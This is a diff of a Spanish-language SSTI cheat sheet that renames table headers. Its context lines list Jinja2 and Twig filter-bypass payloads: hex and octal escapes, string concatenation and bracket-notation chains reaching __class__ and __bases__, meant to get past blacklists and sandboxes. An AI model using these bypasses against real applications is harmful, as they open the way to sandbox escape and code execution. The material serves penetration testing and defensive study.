@@ -21,7 +21,7 @@ linked:
 
 ## Encoding (Unicode / Hex / Base64)
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Hex escapes en strings (Python) | `'\x5f\x5fclass\x5f\x5f'` (= `__class__`) | Bypass de blacklist de `__`. |
 | Octal escapes | `'\137\137class\137\137'` | Misma idea, base 8. |
@@ -41,7 +41,7 @@ ___
 
 ## String Concatenation
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Python `+` | `{{ '__cl' + 'ass__' }}` | Concat string en runtime. |
 | Python `format` | `{{ "{}{}{}".format('__','cl','ass') }}` | format con placeholders. |
@@ -60,7 +60,7 @@ ___
 
 ## Attribute Lookup Chains
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Python dot notation | `obj.__class__.__bases__` | Default — bloqueado por sandboxes. |
 | Python bracket notation | `obj['__class__']['__bases__']` | Bypass `.` filter. |
@@ -99,7 +99,7 @@ ___
 
 ## Comment / Whitespace Tricks
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Comentarios Twig | `{{ '_'~{# comment #}'_class__' }}` | Romper string match con comment. |
 | Comentarios Jinja2 | `{{ '__cl' ~ {# x #} ~ 'ass__' }}` | Ver arriba. |
